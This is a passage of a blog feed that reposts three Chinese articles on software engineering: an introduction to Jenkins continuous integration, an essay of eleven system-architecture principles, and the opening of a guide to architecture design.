        <content type="html"><![CDATA[<p>[转]<a href="https://www.toutiao.com/article/6728738728178614796/">超详细的jenkins持续集成工作原理、功能、部署方式等介绍</a></p><h1 id="1-概念"><a href="#1-概念" class="headerlink" title="1 概念"></a>1 概念</h1><p>jenkins是一个开源项目，提供了一种易于使用的持续集成系统，使开发者从繁杂的集成中解脱出来，专注于更为重要的业务逻辑实现上。同时 Jenkins 能实时监控集成中存在的错误，提供详细的日志文件和提醒功能，还能用图表的形式形象地展示项目构建的趋势和稳定性。</p><p>Jenkins可以构建一个自动化的持续集成环境可以使用它来“自动化”编译、打包、分发部署应用，它兼容ant、maven、gradle等多种第三方构建工具，同时与svn、git能无缝集成，也支持直接与知名源代码托管网站，如github、bitbucket直接集成。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-898b9e36c4b4bddb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="2-Jenkins的功能"><a href="#2-Jenkins的功能" class="headerlink" title="2 Jenkins的功能"></a>2 Jenkins的功能</h1><p><img src="https://upload-images.jianshu.io/upload_images/15531792-aebeb0003ff1fce4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ol><li><p>定时拉取代码并编译</p></li><li><p>静态代码分析</p></li><li><p>定时打包发布测试版</p></li><li><p>自定义操作，如跑单元测试等</p></li><li><p>出错提醒</p></li></ol><p><img src="https://upload-images.jianshu.io/upload_images/15531792-1387a77558b6714f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="3-原理"><a href="#3-原理" class="headerlink" title="3 原理"></a>3 原理</h1><p><img src="https://upload-images.jianshu.io/upload_images/15531792-c78fcf302814da8e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>这里是选择Gitlab作为git server。Gitlab的功能和Github差不多，但是是开源的，可以用来搭建私有git server，也提供非常强大的web GUI，比如开发者互相review源代码的时候就会很方便。系统的工作流程大概分为以下几步:</p><blockquote><p>1&gt; 开发者将新版本push到git server (Gitlab)。</p><p>2&gt; Gitlab随后触发jenkins master结点进行一次build。(通过web hook或者定时检测)</p><p>3&gt; jenkins master结点将这个build任务分配给若干个注册的slave结点中的一个，这个slave结点根据一个事先设置好的脚本进行build。这个脚本可以做的事情很多，比如编译，测试，生成测试报告等等。这些原本需要手动完成的任务都可以交给jenkins来做。</p><p>4&gt; 我们在build中要进行编译，这里使用了分布式编译器distcc来加快编译速度。</p></blockquote><p>jenkins的工作原理是先将源代码从gitlab中拷贝一份到本地，然后根据设置的脚本进行build。我们可以看出，整个系统的关键就是那个build脚本，用来告诉jenkins在一次集成中需要执行的任务。</p><p>不过我之后是用的Github作为git server。但其实差不多。</p><h1 id="4-部署方式"><a href="#4-部署方式" class="headerlink" title="4 部署方式"></a>4 部署方式</h1><p>1、jenkins触发式构建：</p><p>用于开发环境部署，开发人员push代码或者合并代码到gitlab项目的master分支，jenkins就部署代码到对应服务器。</p><p>2、jenkins参数化构建：</p><p>用于测试环境预上线环境部署，开发push代码或者合并代码到gitlab项目的master分支之后，并不会部署代码，而是需要登录到jenkins的web界面，点击构建按钮，传入对应的参数（比如参数需要构建的tag，需要部署的分支）然后才会部署。</p><p>3、jenkins定时构建：</p><p>用于APP自动打包，定时构建是在参数化构建的基础上添加的，开发人员可以登录jenkins手动传入tag进行打包，如果不手动打包，那么jenkins就每天凌晨从gitlab拉取最新的APP代码打包。</p><h1 id="5-持续集成的分类"><a href="#5-持续集成的分类" class="headerlink" title="5 持续集成的分类"></a>5 持续集成的分类</h1><p><img src="https://upload-images.jianshu.io/upload_images/15531792-7669176f044df5c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ol><li><p>持续集成：指程序员在代码的开发工程中，可以频繁的将代码部署到主干上，并进行自动化测试</p></li><li><p>持续交付：指在持续集成的基础之上，将代码部署到线上测试环境</p></li><li><p>持续部署：指在持续交付的基础之上，将要部署的代码实现自动部署，包括持续交互、持续部署</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我做系统架构的一些原则</title>
      <link href="/2022/09/11/%E6%88%91%E5%81%9A%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8E%9F%E5%88%99/"/>
      <url>/2022/09/11/%E6%88%91%E5%81%9A%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8E%9F%E5%88%99/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://coolshell.cn/articles/21672.html">我做系统架构的一些原则</a></p><p>工作 20 多年了，这 20 来年看到了很多公司系统架构，也看到了很多问题，在跟这些公司进行交流和讨论的时候，包括进行实施和方案比较的时候，都有很多各种方案的比较和妥协，因为相关的经历越来越多，所以，逐渐形成了自己的逻辑和方法论。今天，想写下这篇文章，把我的这些个人的经验和想法总结下来，希望能够让更多的人可以参考和借鉴，并能够做出更好的架构来。另外，我的这些思维方式和原则都针对于现有市面上众多不合理的架构和方案，所以，也算是一种“纠正”……（注意，这篇文章所说的这些架构上的原则，一般适用于相对比较复杂的业务，如果只是一些简单和访问量不大的应用，那么你可能会得出相反的结论）</p><h2 id="原则一：关注于真正的收益而不是技术本身"><a href="#原则一：关注于真正的收益而不是技术本身" class="headerlink" title="原则一：关注于真正的收益而不是技术本身"></a>原则一：关注于真正的收益而不是技术本身</h2><p>对于软件架构来说，我觉得第一重要的是架构的收益，如果不说收益，只是为了技术而技术，而没有任何意义。对于技术收益来说，我觉得下面这几个收益是非常重要的：</p><ul><li><strong>是否可以降低技术门槛加快整个团队的开发流程</strong>。能够加快整个团队的工程流程，快速发布，是软件工程一直在解决的问题，所以，系统架构需要能够进行并行开发，并行上线和并行运维，而不会让某个团队成为瓶颈点。（注：就算拖累团队的原因是组织构架，也不妨碍我们做出并行的系统架构设计）</li><li><strong>是否可以让整个系统可以运行的更稳定</strong>。要让整个系统可以运行的更为的稳定，提升整个系统的 SLA，就需要对有计划和无计划的停机做相应的解决方案（参看《<a href="https://coolshell.cn/articles/17459.html" title="关于高可用的系统">关于高可用的架构</a>》）</li><li><strong>是否可以通过简化和自动化降低成本</strong>。最高优化的成本是人力成本，人的成本除了慢和贵，还有经常不断的 human error。如果不能降低人力成本，反而需要更多的人，那么这个架构设计一定是失败的。除此之外，是时间成本，资金成本。</li></ul><p>如果一个系统架构不能在上面三个事上起到作用，那就没有意义了。</p><h2 id="原则二：以应用服务和-API-为视角，而不是以资源和技术为视角"><a href="#原则二：以应用服务和-API-为视角，而不是以资源和技术为视角" class="headerlink" title="原则二：以应用服务和 API 为视角，而不是以资源和技术为视角"></a>原则二：以应用服务和 API 为视角，而不是以资源和技术为视角</h2><p>国内很多公司都会有很多分工，基本上都会分成运维和开发，运维又会分成基础运维和应用运维，开发则会分成基础核心开发和业务开发。不同的分工会导致完全不同的视角和出发点。比如，基础运维和开发的同学更多的只是关注资源的利用率和性能，而应用运维和业务开发则更多关注的是应用和服务上的东西。这两者本来相关无事，但是因为分布式架构的演进，导致有一些系统已经说不清楚是基础层的还是应用层的了，比如像服务治理上的东西，里面即有底层基础技术，也需要业务的同学来配合，包括 k8s 也样，里面即有底层的如网络这样的技术，也有需要业务配合的 readniess和 liveness 这样的健康检查，以及业务应用需要 configMap 等等 ……</p><p><strong>这些东西都让我感觉到所谓 DevOps，其实就是因为很多技术和组件已经分不清是 Dev 还是 Ops 的了，所以，需要合并 Dev和 Ops</strong>。而且，整个组织和架构的优化，已经不能通过调优单一分工或是单一组件能够有很大提升的了。其需要有一种自顶向下的，整体规划，统一设计的方式，才能做到整体的提升（可以试想一下城市交通的优化，当城市规模到一定程度的时候，整体的性能你是无法通过优化几条路或是几条街区来完成的，你需要对整个城市做整体的功能体的规划才可能达到整体效率的提升）。而为了做到整体的提升，需要所有的人都要有一个统一的视角和目标，这几年来，我觉得这个目标就是——<strong>要站在服务和 对外API的视角来看问题，而不是技术和底层的角度。</strong></p><h2 id="原则三：选择最主流和成熟的技术"><a href="#原则三：选择最主流和成熟的技术" class="headerlink" title="原则三：选择最主流和成熟的技术"></a>原则三：选择最主流和成熟的技术</h2><p>技术选型是一件很重要的事，技术一旦选错，那会导致整个架构需要做调整，而对架构的调整重来都不是一件简单的事，我在过去几年内，当系统越来越复杂的时候，用户把他们的  PHP，Python, .NET，或 Node.js 的架构完全都迁移到 Java + Go 的架构上来的案例不断的发生。这个过程还是非常痛苦的，但是你没有办法，当你的系统越来越复杂，越来越大时，你就再也不能在一些玩具技术上玩了，你需要的更为工业化的技术。</p><ul><li><p><strong>尽可能的使用更为成熟更为工业化的技术栈，而不是自己熟悉的技术栈。</strong> 所谓工业化的技术栈，你可以看看大多数公司使用的技术栈，比如：互联网，金融，电信……等等 ，大公司会有更多的技术投入，也需要更大规模的生产，所以，他们使用的技术通常来说都是比较工业化的。在技术选型上，千万不要被——“你看某个视频公司也在用这个技术”，或是一些在论坛上看到的一些程序员吐槽技术的观点（没有任何的数据，只有自己的喜好）来决定自己的技术，还是看看主流大多数公司实际在用的技术栈，会更靠谱一些。</p></li><li><p><strong>选择全球流行的技术，而不是中国流行的技术</strong>。技术这个东西一定是一个全球化的东西，不是一个局域化的事。所以，一定要选国际化的会更好。另外，千万不要被某些公司的“特别案例”骗过去了，那怕这个案例很性感，关键还是要看解决问题的思路和采用的技术是否具有普世性。只有普世性的技术有更强的生命力。</p></li><li><p><strong>尽可能的使用红利大的主流技术，而不要自己发明轮子，更不要魔改。</strong>我见过好些个公司魔改开源软件，比如有个公司同魔改mesos，最后改着改着发现自己发明另一个 kubernetes。我还见过很多公司或技术团队喜欢自己发明自己的专用轮子，最后都会被主流开源软件所取代。完全没有必要。不重新发明轮子，不魔改，不是因为自己技术不能，而是因为，这个世界早已不是自己干所有事的年代了，这个时代是要想尽方法跟整个产业，整个技术社区融合和合作，这样才会有最大的收益。那些试图因为某个特例需要自成一套的玩法，短期没问题，但长期来说，我都不看好。</p></li><li><p><strong>绝大多数情况下，如无非常特殊要求，选 Java基本是不会错的。</strong>一方面，这是因为 Java 的业务开发的生产力是非常好的，而且有 Spring 框架保障，代码很难写烂，另外，Java 的社区太成熟了，你需要的各种架构和技术都可以很容易获得，技术红利实在是太大。这种运行在JVM上的语言有太多太多的好处了。在 Java 的技术栈上，你的架构风险和架构的成本（无论是人力成本，时间成本和资金成本）从长期来说都是最优的</p></li></ul><p>在我见过的公司中，好些公司的架构都被技术负责人个人的喜好、擅长和个人经验给绑架了，完全不是从一个客观的角度来进行技术选型。其实，从 0 到 1 的阶段，你用什么样的技术都行，如果你做一个简单的应用，没有事务处理没有复杂的交易流程，比如一些论坛、社交之类的应用，你用任何语言都行。但是如果有一天你的系统变复杂了，需要处理交易了，量也上来了，从 1 到 10，甚至从 10 到 100，你的开发团队也变大了，需要构建的系统越来越大，你可能会发现你只有一个选择，就是 Java。想想京东从.NET 到 Java，淘宝从 PHP 到 Java……</p><p>注，一些有主观喜好的人一定会对我上述对 Java 的描述感到不适，我还用一些证据说明一下——全中国所有的电商平台，几百家银行，三大电信运营商，所有的保险公司，劵商的系统，医院里的系统，电子政府系统，等等，基本都是用 Java 开发的，包括 AWS 的主流语言也是 Java，阿里云一开始用 C++/Python 写控制系统，后面也开始用 Java ……你可能会说 B站是用 go语言，但是你可能不知道 B 站的电商和大数据是用 Java……懂着数据分析的同学，建议上各大招聘网站上搜一下 Java 的职位数量，你就知道某个技术是否主流和热门……</p><h2 id="原则四：完备性会比性能更重要"><a href="#原则四：完备性会比性能更重要" class="headerlink" title="原则四：完备性会比性能更重要"></a>原则四：完备性会比性能更重要</h2><p>我发现好些公司的架构师做架构的时候，首要考虑的是架构的性能是否能够撑得住多大多大的流量，而不是考虑系统的完备性和扩展性。所以，我已经多次见过这样的案例了，一开始直接使用 MongoDB 这样的非关系型数据库，或是把数据直接放在 Redis 里，而直接放弃关系型数据库的数据完备性的模型，而在后来需要在数据上进行关系查询的时候，发现 NoSQL 的数据库在 Join 上都表现的太差，然后就开始各种飞线，为了不做 Join 就开始冗余数据，然而自己又维护不好冗余数据后带来的数据一致性的问题，导致数据上的各种错乱丢失。</p><p>所以，我给如下的一些如下的架构原则：</p><ul><li><p><strong>使用最科学严谨的技术模型为主，并以不严谨的模型作为补充。</strong>对于上面那个案例来说，就是——永远使用完备支持 ACID 的关系型数据库，然后用 NoSQL 作补充，而不是完全放弃关系型数据库。这里的原则就是所谓的“先紧后松”，一开始紧了，你可以慢慢松，但是开始松了，以后你想紧再也紧不过来了。</p></li><li><p><strong>性能上的东西，总是有很多解的。</strong>我这么多年的经历告诉我，性能上的事，总是有解的，手段也是最多的，这个比起架构的完备性和扩展性来说真的不必太过担心。<br>为了追求所谓的性能，把整个系统的完备性丢失掉，相当地得不偿失。</p></li></ul><h2 id="原则五：制定并遵循服从标准、规范和最佳实践"><a href="#原则五：制定并遵循服从标准、规范和最佳实践" class="headerlink" title="原则五：制定并遵循服从标准、规范和最佳实践"></a>原则五：制定并遵循服从标准、规范和最佳实践</h2><p>这个原则是非常重要的，因为只有服从了标准，你的架构才能够有更好的扩展性。比如：我经常性的见到很多公司的系统既没有服从业界标准，也没有形成自己公司的标准，感觉就像一群乌合之众一样。最典型的例子就是 HTTP 调用的状态返回码。业内给你的标准是 200表示成功，3xx 跳转，4xx 表示调用端出错，5xx 表示服务端出错，我实在是不明白为什么无论成功和失败大家都喜欢返回 200，然后在 body 里指出是否error（前两年我在微信公众号里看到一个有一定名气的互联网老兵推荐使用无论正确还是出错都返回 200 的做法，我在后台再三确认后，我发现这样的架构师真是害人不浅）。这样做最大的问题是——监控系统将在一种低效的状态下工作。监控系统需要把所有的网络请求包打开后才知道是否是错误，而且完全不知道是调用端出错还是服务端出错，于是一些像重试或熔断这样的控制系统完全不知道怎么搞（如果是 4xx错，那么重试或熔断是没有意义的，只有 5xx 才有意义）。<strong>有时候，我会有种越活越退步的感觉，错误码设计这种最基本最基础的东西为什么会没有？并且一个公司会任由着大家乱来？这些基础技能怎么就这样丢掉了？</strong></p><p>还有，我还见过一些公司，他们整个组织没有一个统一的用户 ID 的设计，各个系统之间同步用户的数据是通过用户的身份证 ID，是的，就是现实世界的身份证 ID，包括在网关上设置的用户白名单居然也是用身份证 ID。我对这个公司的内的用户隐私管理有很大的担忧。一个企业，一个组织，如果没有标准和规范，也就会有抽象，这一定是要出各种乱子的。</p><p>下面，我罗列一些你需要注意的标准和规范（包括但不限于）：</p><ul><li><strong>服务间调用的协议标准和规范。</strong> 这其中包括 Restful API路径, HTTP 方法、状态码、标准头、自定义头等，返回数据 JSon Scheme……等。</li><li><strong>一些命名的标准和规范。</strong>这其中包括如：用户 ID，服务名、标签名、状态名、错误码、消息、数据库……等等</li><li><strong>日志和监控的规范。</strong>这其中包括：日志格式，监控数据，采样要求，报警……等等</li><li><strong>配置上的规范。</strong>这其中包括：操作系统配置、中间件配置，软件包……等等</li><li><strong>中间件使用的规范。</strong>数据库，缓存、消息队列……等等</li><li><strong>软件和开发库版本统一。</strong>整个组织架构内，软件或开发库的版本最好每年都升一次级，然后在各团队内统一。</li></ul><p>这里重要说一下两个事：</p><ul><li><strong>Restful API 的规范</strong>。我觉得是非常重要的，这里给两个我觉得写得最好的参考：<a href="https://github.com/paypal/api-standards/blob/master/api-style-guide.md">Paypal</a> 和 <a href="https://github.com/microsoft/api-guidelines">Microsoft</a> 。Restful API 有一个标准和规范最大的好处就是监视可以很容易地做各种统计分析，控制系统可以很容易的做流量编排和调度。</li><li><strong>另一个是服务调用链追踪</strong>。对于服务调用链追踪来说，基本上都是参考于 <a href="https://research.google/pubs/pub36356/">Google Dapper</a> 这篇论文，目前有很多的实现，最严格的实现是 <a href="https://zipkin.io/">Zipkin</a>，这也是 Spring Cloud Sleuth 的底层实现。Zipkin 贴近 Google Dapper 论文的好处在于——无状态，快速地把 Span 发出来，不消耗服务应用侧的内存和 CPU。这意味着，监控系统宁可自己死了也不能干扰实际应用。</li><li><strong>软件升级</strong>。我发现很多公司包括 BAT，他们完全没有软件升级的活动，全靠开发人员自发。然而，这种成体系的活动，是永远不可能靠大众的自发形成的。一个公司至少一年要有一次软件版本升级的review，然后形成软件版本的统一和一致，这样会极太简化系统架构的复杂度。</li></ul><h2 id="原则六：重视架构扩展性和可运维性"><a href="#原则六：重视架构扩展性和可运维性" class="headerlink" title="原则六：重视架构扩展性和可运维性"></a>原则六：重视架构扩展性和可运维性</h2><p>在我见过很多架构里，技术人员只考虑当下，但从来不考虑系统的未来扩展性和可运维性。所谓的管生不管养。如果你生下来的孩子胳膊少腿，严重畸形，那么未来是很难玩的。因为架构和软件不是写好就完的，是需要不断修改不断维护的，80%的软件成本都是在维护上。所以，如何让你的架构有更好的扩展性，可以更容易地运维，这个是比较重要的。所谓的扩展性，意味着，我可以很容易地加更多的功能，或是加入更多的系统，而所谓可运维，就是说我可以对线上的系统做任意的变更。扩展性要求的是有标准规范且不耦合的业务架构，可运维性要求的则是可控的能力，也就是一组各式各样的控制系统。</p><ul><li><strong>通过服务编排架构来降低服务间的耦合</strong>。比如：通过一个业务流程的专用服务，或是像 Workflow，Event Driven Architecture ， Broker，Gateway，Service Discovery 等这类的的中间件来降低服务间的依赖关系。</li><li><strong>通过服务发现或服务网关来降低服务依赖所带来的运维复杂度</strong>。服务发现可以很好的降低相关依赖服务的运维复杂度，让你可以很轻松的上线或下线服务，或是进行服务伸缩。</li><li><strong>一定要使用各种软件设计的原则</strong>。比如：像SOLID这样的原则（参看《<a href="https://coolshell.cn/articles/4535.html" title="一些软件设计的原则">一些软件设计的原则</a>》），IoC/DIP，SOA 或 Spring Cloud 等 架构的最佳实践（参看《<a href="https://coolshell.cn/articles/5701.html" title="SteveY对Amazon和Google平台的吐槽 - 67,710 人阅读">SteveY对Amazon和Google平台的吐槽</a>》中的 Service Interface 的那几条军规），分布式系统架构的相关实践（参看：《<a href="https://coolshell.cn/articles/10910.html" title="分布式系统的事务处理">分布式系统的事务处理</a>》，或微软件的 《<a href="https://docs.microsoft.com/en-us/azure/architecture/patterns/">Cloud Design Patterns</a>》）……等等</li></ul><h2 id="原则七：对控制逻辑进行全面收口"><a href="#原则七：对控制逻辑进行全面收口" class="headerlink" title="原则七：对控制逻辑进行全面收口"></a>原则七：对控制逻辑进行全面收口</h2><p>所有的程序都会有两种逻辑，一种是业务逻辑，一种是控制逻辑，业务逻辑就是完成业务的逻辑，控制逻辑是辅助，比如你用多线程，还是用分布式，是用数据库还是用文件，如何配置、部署，运维、监控，事务控制，服务发现，弹性伸缩，灰度发布，高并发，等等，等等 ……这些都是控制逻辑，跟业务逻辑没有一毛钱关系。控制逻辑的技术深度会通常会比业务逻辑要深一些，门槛也会要高一些，所以，最好要专业的程序员来负责控制逻辑的开发，统一规划统一管理，进行收口。这其中包括：</p><ul><li><strong>流量收口。</strong>包括南北向和东西向的流量的调度，主要通过流量网关，开发框架 SDK或 Service Mesh 这样的技术。</li><li><strong>服务治理收口。</strong>包括：服务发现、健康检查，配置管理、事务、事件、重试、熔断、限流……主要通过开发框架 SDK – 如：Spring Cloud，或服务网格Service Mesh等技术。</li><li><strong>监控数据收口。</strong>包括：日志、指标、调用链……主要通过一些标准主流的探针，再加上后台的数据清洗和数据存储来完成，最好是使用无侵入式的技术。监控的数据必须统一在一个地方进行关联，这样才会产生信息。</li><li><strong>资源调度有应用部署的收口。</strong>包括：计算、网络和存储的收口，主要是通过容器化的方案，如k8s来完成。</li><li><strong>中间件的收口。</strong>包括：数据库，消息，缓存，服务发现，网关……等等。这类的收口方式一般要在企业内部统一建立一个共享的云化的中间件资源池。</li></ul><p>对此，这里的原则是：</p><ul><li><strong>你要选择容易进行业务逻辑和控制逻辑分离的技术。</strong>这里，Java 的 JVM+字节码注入+AOP 式的Spring 开发框架，会带给你太多的优势。</li><li><strong>你要选择可以享受“前人种树，后人乘凉”的有技术红利的技术。</strong>如：有庞大社区而且相互兼容的技术，如：Java, Docker,  Ansible，HTTP，Telegraf/Collectd……</li><li><strong>中间件你要使用可以 支持HA集群和多租户的技术。</strong> 这里基本上所有的主流中间件都会支持 HA 集群方式的。</li></ul><h2 id="原则八：不要迁就老旧系统的技术债务"><a href="#原则八：不要迁就老旧系统的技术债务" class="headerlink" title="原则八：不要迁就老旧系统的技术债务"></a>原则八：不要迁就老旧系统的技术债务</h2><p>我发现很多公司都很非常大的技术债务，这些债务具体表现如下：</p><ul><li><strong>使用老旧的技术。</strong> 比如，使用HTTP1.0， Java 1.6，Websphere，ESB，基于 socket的通讯协议，过时的模型……等等</li><li><strong>不合理的设计。</strong> 比如，在 gateway 中写大量的业务逻辑，单体架构，数据和业务逻辑深度耦合，错误的系统架构（把缓存当数据库，用消息队列同步数据）……等等</li><li><strong>缺少配套设施。</strong>比如，没有自动化测试，没有好的软件文档，没有质量好的代码，没有标准和规范……等等</li></ul><p>来找我寻求技术帮助的人都有各种各样的问题。我都会对他们苦口婆心地说同样的一句话——“<strong>如果你是来找我 case-by-case 解决问题，我兴趣不大，因为，你们千万不要寄希望能够很简单的把一辆夏利车改成一辆法拉利跑车，或是把一栋地基没打好的歪楼搞正。以前欠下的技术债，都得要还，没打好的地基要重新打，没建配套设施都要建。这些基础设施如果不按照正确科学的方式建立的话，你是不可能有一个好的的系统，我也没办法帮你 case-by-case 的解决问题……”</strong>，一开始，他们都会对我说，没问题，我们就是要还债，但是，最后发现要还的债真多，有点承受不了，就开始现原形了。</p><p>他们开始为自己的“欠的技术债”找各种合理化的理由——给你解释各种各样的历史原因和不得以而为之的理由。谈着谈着，让我有一种感觉——他们希望得到一种什么都不改什么都不付出的方式就可以进步的心态，他们宁可让新的技术 low 下来迁就于这些技术债，把新的技术滥用地乱七八糟的。有一个公司，他们的系统架构和技术选型基本都搞错了，使用错误的模型构建系统，导致整个系统的性能非常之差，也才几千万条数据，但他们想的不是还债，不是把地基和配套设施建好，而且要把楼修的更高，上更多的系统——他们觉得现有的系统挺好，性能问题的原因是他们没一个大数据平台，所以要建大数据平台……</p><p>我见过很多很多公司，包括大如 BAT 这样的公司，都会在原来的技术债上进行更多的建设，然后，技术债越来越大，利息越来越大，最终成为一个高利贷，再也还不了（我在《<a href="https://coolshell.cn/articles/11656.html">开发团队的效率</a>》一文中讲过一个 WatchDog 的架构模式，一个系统烂了，不是去改这个系统，而是在旁边建一个系统来看着它，我很难理解为什么会有这样的逻辑，也许是为了要解决更多的就业……）</p><p>这里有几个原则和方法我是非常坚持的，分享给大家：</p><ul><li><strong>与其花大力气迁就技术债务，不如直接还技术债。是所谓的长痛不如短痛。</strong></li><li><strong>建设没有技术债的“新城区”，并通过“<a href="https://docs.microsoft.com/en-us/azure/architecture/patterns/anti-corruption-layer">防腐层</a> ”的架构模型，不要让技术债侵入“新城区”</strong>。</li></ul><h2 id="原则九：不要依赖自己的经验，要依赖于数据和学习"><a href="#原则九：不要依赖自己的经验，要依赖于数据和学习" class="headerlink" title="原则九：不要依赖自己的经验，要依赖于数据和学习"></a>原则九：不要依赖自己的经验，要依赖于数据和学习</h2><p>有好些人来找我跟我说他们的技术问题，然后希望我能够给他们一个答案。我说，我需要了解一下你现有系统的情况，也就是需要先做个诊断，我只有得到这些数据后，我才可能明白真正的原因是什么 ，我才可能给你做出一个比较好的技术方案。我个人觉得这是一种对对方负责的方法，因为技术手段太多了，所有的技术手段都有适应的场景，并且有各种 trade-off，所以，只有调研完后才能做出决定。这跟医生看病是一样的，确诊病因不能靠经验，还是要靠诊断数据。在科学面前，所有的经验都是靠不住的……</p><p>另外，如果有一天你在做技术决定的时候，开始凭自己以往的经验，那么你就已经不可能再成长了。人都是不可能通过不断重复过去而进步的，人的进步从来都是通过学习自己不知道的东西。所以，千万不要依赖于自己的经验做决定。做任何决定之前，最好花上一点时间，上网查一下相关的资料，技术博客，文章，论文等 ，同时，也看看各个公司，或是各个开源软件他们是怎么做的？然后，比较多种方案的 Pros/Cons，最终形成自己的决定，这样，才可能做出一个更好的决定。</p><h2 id="原则十：千万要小心-X-–-Y-问题，要追问原始需求"><a href="#原则十：千万要小心-X-–-Y-问题，要追问原始需求" class="headerlink" title="原则十：千万要小心 X – Y 问题，要追问原始需求"></a>原则十：千万要小心 X – Y 问题，要追问原始需求</h2><p>对于 <a href="https://coolshell.cn/articles/10804.html" title="X-Y Problem">X-Y 问题</a>，也就是说，用户为了解决 X问题，他觉得用 Y 可以解，于是问我 Y 怎么搞，结果搞到最后，发现原来要解决的 X 问题，这个时候最好的解决方案不是 Y，而是 Z。 这种 X-Y 问题真是相当之多，见的太多太多了。所以，每次用户来找我的时候，我都要不断地追问什么是 X 问题。</p><p>比如，好些用户都会来问我他们要一个大数据流式处理，结果追问具体要解决什么样的问题时，才发现他们的问题是因为服务中有大量的状态，需要把相同用户的数据请求放在同一个服务上处理，而且设计上导致一个慢函数拖慢整个应用服务。最终就是做一下性能调优就好了，根本没有必要上什么大数据的流式处理。</p><p>我很喜欢追问为什么 ，这种追问，会让客户也跟着来一起重新思考。比如，有个客户来找我评估的一个技术架构的决定，从理论上来说，好像这个架构在用户的这个场景下非常不错。但是，这个场景和这个架构是我职业生涯从来没有见过的。于是，我开始追问这个为什么会是这么一个场景？当我追问的时候，我发现用户都感到这个场景的各种不合理。最后引起了大家非常深刻的研讨，最终用户把那个场景修正后，而架构就突然就变成了一个常见且成熟的的模型……</p><h2 id="原则十一：激进胜于保守，创新与实用并不冲突"><a href="#原则十一：激进胜于保守，创新与实用并不冲突" class="headerlink" title="原则十一：激进胜于保守，创新与实用并不冲突"></a>原则十一：激进胜于保守，创新与实用并不冲突</h2><p>我对技术的态度是比较激进的，但是，所谓的激进并不是瞎搞，也不是见新技术就上，而是积极拥抱会改变未来的新技术，如：Docker/Go，我就非常快地跟进，但是像区块链或是 Rust 这样的，我就不是很积极。因为，其并没有命中我认为的技术趋势的几个特征（参看《<a href="https://coolshell.cn/articles/18190.html" title="Go语言、Docker 和新技术">Go,Docker 和新技术</a> 》）。当然，我也不是不喜欢的就不学了，我对区块链和 Rust 我一样学习，我也知道这些技术的优势，但我不会大规模使用它们。另外，我也尊重保守的决定，这里面没有对和错。但是，我个人觉得对技术激进的态度比起保守来说有太多的好处了。一方面来说，对于用户来说，很大程度上来说，新技术通常都表面有很好的竞争力，而且我见太多这样成功的公司都在积极拥抱新的技术的，而保守的通常来说都越来越不好。</p><p>有一些人会跟我说，我们是实用主义，我们不需要创新，能解决当下的问题就好，所以，我们不需要新技术，现有的技术用好就行了。这类的公司，他们的技术设计第一天就在负债，虽然可以解决当下问题，但是马上就会出现新的问题，然后他们会疲于解决各种问题。最后呢，最后还是会走到新的技术上。</p><p>这里的逻辑很简单 —— <strong>进步永远来自于探索，探索是要付出代价的，但是收益更大</strong>。对我而言，不敢冒险才是最大的冒险，不敢犯错才是最大的错误，害怕失去会让你失去的更多……</p><p>（全文完）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何做架构设计</title>
      <link href="/2022/09/11/%E5%A6%82%E4%BD%95%E5%81%9A%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1/"/>
      <url>/2022/09/11/%E5%A6%82%E4%BD%95%E5%81%9A%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://juejin.cn/post/6956851455999344670">如何做架构设计</a></p><p>首先要牢记一条：</p><blockquote><p>“ 不存在一个适用于所有应用的完美架构 ”</p></blockquote><p>如何去选择一个架构模式并不是首要之事，相较之下，搞清楚你想用架构解决什么问题更为重要。花一些时间去理解你所要解决的问题，这样可以帮助你聚焦于架构模式中能真正起作用的那些特性。踏实地按照以下步骤去操作，可以确保你设计的架构是有效的：</p><ul><li>掌握代码库当前所处的状态</li><li>标识出你想要解决的问题或者想要优化的代码</li><li>评估不同的架构模式</li><li>在做出选择前，先尝试其中一些模式看是否合适</li><li>为你的应用定义好架构基线，设立好相关的界限</li><li>回过头看你的架构是否可以有效地解决那些标识出来的问题</li><li>与时俱进，不断迭代和优化你的架构</li></ul><h4 id="定位问题"><a href="#定位问题" class="headerlink" title="定位问题"></a>定位问题</h4><p>通常好的架构设计实践所解决的问题主要有两个：<code>缓慢的研发效率</code>、<code>脆弱的代码质量</code>。当你遇到下面这些情况时，就会导致低效的低质：</p><ul><li>我能难读懂代码库中的代码</li><li>我改动代码有时会造成原有功能产生 bug</li><li>我的应用运行时表现地很脆弱</li><li>我的代码能难被复用</li><li>我的改动会导致大规模的代码重构</li><li>我的同事很难并行协同开发</li><li>我能难给代码写单元测试</li><li>我的团队很难把一个需求拆解成小的工作项</li><li>我的应用编译一次要很久</li></ul><p>导致这些问题的根本原因通常有两个：<code>强耦合</code>、<code>大类型</code>。<br><code>强耦合</code>指代码库中有大量的高度依赖代码，变量、类型、对象直接连接访问，缺少协议和接口，从而导致牵一发而动全身，读懂代码需要完全掌握所有依赖关系。<br><code>大类型</code>是指类、结构体、协议或枚举拥有很长的接口定义（属性和方法），对于开发者而言，在已有的类中加方法比重新设计一个类轻松地多，大类型应运而生，导致实现体也很长，问题也就接踵而至。</p><p>另外，好的架构可以帮助我们解耦，为应用增加灵活性，变得更敏捷。这样可以使我们快速响应技术和需求上的变化。当你面临如下情况时，就表示当前代码库不够敏捷：</p><ul><li>我发现自己被一种技术/实现束缚住了</li><li>我面临着在项目初期做出技术/实现上的重大抉择</li><li>我发现很难增加功能开关</li></ul><h4 id="架构选型"><a href="#架构选型" class="headerlink" 